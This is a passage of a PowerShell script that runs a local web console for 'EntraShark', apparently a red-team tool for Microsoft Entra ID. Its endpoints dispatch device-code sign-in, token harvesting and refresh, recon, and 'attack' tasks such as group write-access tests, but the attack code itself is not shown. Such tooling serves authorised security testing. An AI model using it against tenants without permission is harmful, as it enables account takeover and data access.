async function refreshTask(id, resetLog){ const j=await getJson('/api/task?id='+encodeURIComponent(id)); if(!j.ok) return; const t=j.task; document.getElementById('taskSummary').innerHTML = `<p><b>${esc(t.kind)}</b> - ${esc(t.state)} - ${esc(t.message||'')}</p>${t.error?'<p style="color:#b42318">'+esc(t.error)+'</p>':''}`; appendLogRows(id, j.log||[], resetLog); if(t.state==='running') setActivity(`${t.kind} running: ${t.message||''}`, 'busy'); const dev = t.result && t.result.verificationUri ? t.result : null; if(dev){ document.getElementById('deviceBox').style.display='block'; document.getElementById('deviceBox').innerHTML=`<h3>Device Code Sign-in</h3><p>Open <a target="_blank" href="${esc(dev.verificationUri)}">${esc(dev.verificationUri)}</a></p><p style="font-size:26px"><b>${esc(dev.userCode)}</b></p><p>${esc(dev.message||'')}</p>`; } if(t.state==='completed'||t.state==='failed'){ setActivity(`${t.kind} ${t.state}: ${t.message||''}`, t.state==='failed'?'error':''); if((t.kind||'').includes('auth')){ document.getElementById('deviceBox').style.display='block'; document.getElementById('deviceBox').innerHTML=t.state==='completed'?'<h3>Authentication complete</h3><p>Token inventory has been refreshed from the current environment/vault.</p>':`<h3>Authentication failed</h3><p>${esc(t.error||t.message||'Authentication failed.')}</p>`; } if(activeTask===id) activeTask=null; await refreshState(); reloadReport(); } }
function reloadReport(){ setActivity('Refreshing report frame...', 'busy'); document.getElementById('reportFrame').src='/api/report?ts='+Date.now(); document.getElementById('reportFrameWrap').style.display='block'; setActivity('Report frame refreshed.'); }
async function regenerateReport(){ setActivity('Regenerating report from existing evidence...', 'busy'); const j=await postJson('/api/report/rebuild',{}); if(!j.ok){ setActivity(j.error||'Report regeneration failed.', 'error'); return; } await refreshState(); document.getElementById('reportFrame').src='/api/report?ts='+Date.now(); document.getElementById('reportFrameWrap').style.display='block'; setActivity(`Report regenerated from ${j.result.tableCount} table(s), ${j.result.rowCount||0} row(s).`); }
function hideReportFrame(){ document.getElementById('reportFrameWrap').style.display='none'; setActivity('Report frame hidden.'); }
function showReportFrame(){ document.getElementById('reportFrameWrap').style.display='block'; reloadReport(); }
function showReport(){ setActivity('Opening report panel...', 'busy'); reloadReport(); showPanelById('report'); }
async function poll(){ await refreshState(); if(activeTask) await refreshTask(activeTask); }
initModules(); poll(); setInterval(poll, 3000);
</script>
</body>
</html>
'@
}

function Route {
    param($Request)
    $Response = $Request
    $path = $Request.Url.AbsolutePath
    if ($Request.HttpMethod -eq 'GET' -and $path -eq '/') { Send-Response $Response (Get-ConsoleHtml) 'text/html'; return }
    if ($Request.HttpMethod -eq 'GET' -and $path -eq '/api/state') { Send-Response $Response (ConvertTo-JsonText (Get-State)); return }
    if ($Request.HttpMethod -eq 'GET' -and $path -eq '/api/options') { Send-Response $Response (ConvertTo-JsonText (Get-ConsoleOptions)); return }
    if ($Request.HttpMethod -eq 'GET' -and $path -eq '/api/task') { Send-Response $Response (ConvertTo-JsonText (Get-TaskStatus -Id $Request.QueryString['id'])); return }
    if ($Request.HttpMethod -eq 'GET' -and $path -eq '/api/table') { Send-Response $Response (ConvertTo-JsonText ([ordered]@{ ok=$true; rows=@(Get-TableRows -Name $Request.QueryString['name']) }) 40); return }
    if ($Request.HttpMethod -eq 'GET' -and $path -eq '/api/report') {
        $run = Get-CurrentRun; $report = if ($run) { Join-Path $run 'report.html' } else { $null }
        if (-not $report -or -not (Test-Path -LiteralPath $report)) { Send-Response $Response 'No report available' 'text/plain' 404; return }
        Send-Response $Response (Get-Content -LiteralPath $report -Raw) 'text/html'; return
    }

    $body = Read-Body $Request
    if ($Request.HttpMethod -eq 'POST' -and $path -eq '/api/run/new') {
        Send-Response $Response (ConvertTo-JsonText ([ordered]@{ ok=$true; run=(New-ConsoleRun -Name $body.name) })); return
    }
    if ($Request.HttpMethod -eq 'POST' -and $path -eq '/api/run') {
        Send-Response $Response (ConvertTo-JsonText ([ordered]@{ ok=$true; run=(Set-ConsoleRun -Path $body.path) })); return
    }
    if ($Request.HttpMethod -eq 'POST' -and $path -eq '/api/run/clear') {
        Send-Response $Response (ConvertTo-JsonText ([ordered]@{ ok=$true; run=(Clear-ConsoleRun) })); return
    }
    if ($Request.HttpMethod -eq 'POST' -and $path -eq '/api/tokens/refresh') {
        Send-Response $Response (ConvertTo-JsonText ([ordered]@{ ok=$true; tokens=(Get-TokenSummary) })); return
    }
    if ($Request.HttpMethod -eq 'POST' -and $path -eq '/api/report/rebuild') {
        $run = Get-CurrentRun
        if (-not $run) { throw 'No current run is selected.' }
        $result = New-EntraSharkEvidenceReport -Run $run
        Send-Response $Response (ConvertTo-JsonText ([ordered]@{ ok=$true; result=[ordered]@{ report=$result.Report; tableCount=$result.TableCount; rowCount=$result.RowCount } })); return
    }
    if ($Request.HttpMethod -eq 'POST' -and $path -eq '/api/auth') {
        $body = Normalize-AuthRequest -Auth $body
        if ($body.method -eq 'Interactive') {
            $task = Start-ManagedTask -Kind 'interactive-auth' -ScriptBlock $interactiveAuthJob -ArgumentList @($body, (Get-ToolPath 'Invoke-GetGraphTokens.ps1'))
        } else {
            $task = Start-ManagedTask -Kind 'device-code-auth' -ScriptBlock $deviceCodeAuthJob -ArgumentList @($body)
        }
        Send-Response $Response (ConvertTo-JsonText ([ordered]@{ ok=$true; task=$task })); return
    }
    if ($Request.HttpMethod -eq 'POST' -and $path -eq '/api/refresh') {
        $body = Normalize-RefreshRequest -Refresh $body
        $task = Start-ManagedTask -Kind 'refresh' -ScriptBlock $refreshJob -ArgumentList @($body, (Get-ToolPath 'Invoke-RefreshTokens.ps1'))
        Send-Response $Response (ConvertTo-JsonText ([ordered]@{ ok=$true; task=$task })); return
    }
    if ($Request.HttpMethod -eq 'POST' -and $path -eq '/api/recon') {
        $task = Start-ManagedTask -Kind 'recon' -ScriptBlock $reconJob -ArgumentList @($body)
        Send-Response $Response (ConvertTo-JsonText ([ordered]@{ ok=$true; task=$task })); return
    }
    if ($Request.HttpMethod -eq 'POST' -and $path -eq '/api/attack') {
        $tool = if ($body.kind -eq 'updatableGroups') { Get-ToolPath 'Invoke-TestGroupWriteAccess.ps1' } else { $null }
        $task = Start-ManagedTask -Kind "attack-$($body.kind)" -ScriptBlock $attackJob -ArgumentList @($body, $tool)
        Send-Response $Response (ConvertTo-JsonText ([ordered]@{ ok=$true; task=$task })); return
    }
    Send-Response $Response (ConvertTo-JsonText ([ordered]@{ ok=$false; error='Unknown endpoint' })) 'application/json' 404
}

$listener = [Net.Sockets.TcpListener]::new([Net.IPAddress]::Parse('127.0.0.1'), $Port)
$prefix = "http://127.0.0.1:$Port/"
$listener.Start()
Write-Host "[EntraShark] Console listening on $prefix" -ForegroundColor Cyan
Write-Host "[EntraShark] Browser UI has live task polling. Press Ctrl+C to stop." -ForegroundColor DarkGray
if (-not $NoBrowser) { Start-Process $prefix | Out-Null }

try {
    while ($true) {
        $client = $listener.AcceptTcpClient()
        $req = Read-HttpRequest -Client $client
        if (-not $req) { $client.Close(); continue }
        try { Route -Request $req }
        catch { Send-Response $req (ConvertTo-JsonText ([ordered]@{ ok=$false; error=$_.Exception.Message })) 'application/json' 500 }
    }
} finally {
    $listener.Stop()
}
